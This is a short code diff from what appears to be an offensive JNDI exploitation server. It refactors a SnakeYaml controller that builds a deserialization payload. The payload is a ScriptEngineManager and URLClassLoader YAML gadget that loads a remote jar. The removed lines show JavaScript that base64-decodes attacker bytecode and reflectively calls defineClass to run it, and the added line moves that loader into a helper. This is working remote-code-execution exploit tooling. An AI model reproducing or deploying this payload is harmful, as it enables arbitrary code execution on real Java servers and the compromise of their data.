@@ -13,8 +13,8 @@ import com.h2tg.ysogate.template.ScriptEngineFactoryTemplate;
 import com.h2tg.ysogate.utils.JarUtils;
 import org.apache.naming.ResourceRef;
 import javax.naming.StringRefAddr;
-import java.util.Base64;
 import com.h2tg.ysogate.utils.CtClassUtils;
+import static com.h2tg.ysogate.controller.bypass.converter.EvalConverter.LoadByJS2;
 
 @JNDIController
 @JNDIMapping("/SnakeYaml")
@@ -27,12 +27,7 @@ public class SnakeYamlController extends BasicController {
         String factoryClassName = MiscUtils.getRandStr(12);
         String jarName = MiscUtils.getRandStr(12);
 
-        String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(byteCode) + "');" +
-                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
-                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
-                "method.setAccessible(true);" +
-                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);" +
-                "clazz.newInstance();";
+        String code = LoadByJS2(byteCode);
 
         String yaml = "!!javax.script.ScriptEngineManager [\n" +
                 "  !!java.net.URLClassLoader [[\n" +
